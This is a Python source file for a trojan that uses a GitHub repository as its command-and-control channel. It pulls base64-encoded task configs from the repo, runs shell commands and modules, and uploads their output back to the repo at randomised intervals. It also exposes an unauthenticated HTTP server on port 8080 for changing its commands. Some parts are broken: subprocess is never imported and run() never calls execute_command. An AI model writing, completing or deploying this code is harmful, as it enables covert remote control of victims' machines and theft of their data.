import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer

def github_connect():
    with open('secret.txt') as f:
        token = f.read().strip()
    user = 'hacksparkdev'
    sess = github3.login(token=token)
    return sess.repository(user, 'Trojan')

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()
        self.config = {"commands": []}  # Initialize with empty commands
        self.load_config()

    def load_config(self):
        try:
            config_json = get_file_contents('config', self.config_file, self.repo)
            self.config = json.loads(base64.b64decode(config_json))
        except Exception as e:
            print(f"Error loading config: {e}")

    def update_config(self, new_config):
        self.config = new_config
        # Assuming GitHub write permissions and logic to save config if needed
        config_json = base64.b64encode(json.dumps(new_config).encode()).decode()
        self.repo.create_file(f'config/{self.config_file}', 'Update config', config_json)

    def execute_command(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            result = result.decode('utf-8')
        except subprocess.CalledProcessError as e:
            result = e.output.decode('utf-8')
        self.store_module_result(result)

    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
        self.repo.create_file(remote_path, message, bindata)

    def run(self):
        while True:
            for task in self.config.get('commands', []):
                module = task['module']
                if module in sys.modules:
                    thread = threading.Thread(target=self.module_runner, args=(module,))
                    thread.start()
                    time.sleep(random.randint(1, 10))
            time.sleep(random.randint(30*60, 3*60*60))

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/config':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(trojan.config).encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/update-config':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                new_config = json.loads(post_data.decode('utf-8'))
                trojan.update_config(new_config)
                self.send_response(200)
            except Exception as e:
                print(f"Error updating config: {e}")
                self.send_response(500)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == '__main__':
    trojan = Trojan('abc')
    server = HTTPServer(('0.0.0.0', 8080), RequestHandler)
    print("Starting HTTP server on port 8080...")
    server.serve_forever()

